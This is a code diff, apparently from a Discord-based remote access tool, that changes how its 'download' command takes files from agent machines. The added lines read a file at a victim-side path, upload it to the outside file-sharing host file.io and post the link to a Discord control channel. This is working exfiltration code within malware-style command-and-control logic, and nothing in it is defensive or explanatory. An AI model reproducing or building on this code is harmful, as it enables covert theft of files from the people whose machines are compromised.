@@ -199,12 +199,19 @@ async def download(context):
     if int(word_list[0]) == int(ID):
         path = word_list[1].replace("USERNAME", USERNAME)
         try:
-            await channel.send(f"**Agent #{ID}** Requested File:", file=discord.File(path))
+            #await channel.send(f"**Agent #{ID}** Requested File:", file=discord.File(path))
+            file = open(path, "rb")
+            req = requests.post("https://file.io/", files = {
+                "file" : file
+                })
+            link = req.json()["link"]
+            file.close()
+            await channel.send(f"**Agent #{ID}** Requested File:\n{link}")
             my_embed = discord.Embed(title=f"File succesfully downloaded from Agent#{ID}", color=0x00FF00)
             await context.message.channel.send(embed=my_embed)
         except Exception as e:
             my_embed = discord.Embed(title=f"Error while downloading from Agent#{ID}:\n{e}", color=0xFF0000)
-            await context.message.channel.send(embed=my_embed) 
+            await context.message.channel.send(embed=my_embed)
 
 @client.command(name='upload')
 async def upload(context):
